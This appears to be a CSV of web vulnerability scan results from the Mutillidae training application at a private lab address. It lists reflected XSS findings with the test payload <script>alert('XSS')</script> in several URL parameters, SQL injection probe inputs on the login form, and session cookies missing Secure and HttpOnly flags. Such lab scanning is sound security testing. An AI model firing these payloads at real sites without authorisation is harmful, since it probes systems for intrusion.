Vulnerability,Vector,URL/Domain,Parameter/Name,Payload/Issue
XSS,URL,http://10.200.108.120/mutillidae/index.php?page=redirectandlog.php&forwardurl=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,forwardurl,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?do=toggle-hints&page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,page,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?do=toggle-security&page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,page,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&forwardurl=http%3A%2F%2Fwww.owasp.org,page,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?page=redirectandlog.php&forwardurl=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,forwardurl,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&forwardurl=http%3A%2F%2Fwww.issa-kentuckiana.org%2F,page,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?page=redirectandlog.php&forwardurl=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,forwardurl,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&forwardurl=http%3A%2F%2Fwww.owasp.org%2Findex.php%2FLouisville,page,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?page=redirectandlog.php&forwardurl=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,forwardurl,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&forwardurl=http%3A%2F%2Fwww.pocodoy.com%2Fblog%2F,page,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?page=redirectandlog.php&forwardurl=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,forwardurl,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&forwardurl=http%3A%2F%2Fwww.room362.com%2F,page,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?page=redirectandlog.php&forwardurl=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,forwardurl,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&forwardurl=http%3A%2F%2Fwww.isd-podcast.com%2F,page,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?page=redirectandlog.php&forwardurl=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,forwardurl,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&forwardurl=http%3A%2F%2Fpauldotcom.com%2F,page,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?page=redirectandlog.php&forwardurl=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,forwardurl,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&forwardurl=http%3A%2F%2Fwww.php.net%2F,page,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?page=redirectandlog.php&forwardurl=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,forwardurl,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&forwardurl=https%3A%2F%2Faddons.mozilla.org%2Fen-US%2Ffirefox%2Fcollections%2Fjdruin%2Fpr%2F,page,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?page=redirectandlog.php&forwardurl=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,forwardurl,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,page,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?do=toggle-security&page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,page,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,page,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?do=toggle-security&page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,page,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?do=toggle-hints&page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,page,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,page,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?do=toggle-hints&page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,page,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?do=toggle-security&page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,page,<script>alert('XSS')</script>
Injection SQL,FORM,http://10.200.108.120/mutillidae/index.php?page=login.php,Multiple/Form,'g
XSS,FORM,http://10.200.108.120/mutillidae/index.php?page=login.php,Multiple/Form,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?do=toggle-hints&page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,page,<script>alert('XSS')</script>
Injection SQL,FORM,http://10.200.108.120/mutillidae/index.php?page=login.php,Multiple/Form,'d
XSS,URL,http://10.200.108.120/mutillidae/index.php?do=toggle-security&page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,page,<script>alert('XSS')</script>
Injection SQL,FORM,http://10.200.108.120/mutillidae/index.php?page=login.php,Multiple/Form,'d
XSS,FORM,http://10.200.108.120/mutillidae/index.php?page=login.php,Multiple/Form,<script>alert('XSS')</script>
XSS,URL,http://10.200.108.120/mutillidae/index.php?page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,page,<script>alert('XSS')</script>
Cookie Security,INFO,10.200.108.120,PHPSESSID,Secure:False HttpOnly:False
Cookie Security,INFO,10.200.108.120,showhints,Secure:False HttpOnly:False
Cookie Security,INFO,10.200.108.120,PHPSESSID,Secure:False HttpOnly:False
Cookie Security,INFO,10.200.108.120,showhints,Secure:False HttpOnly:False
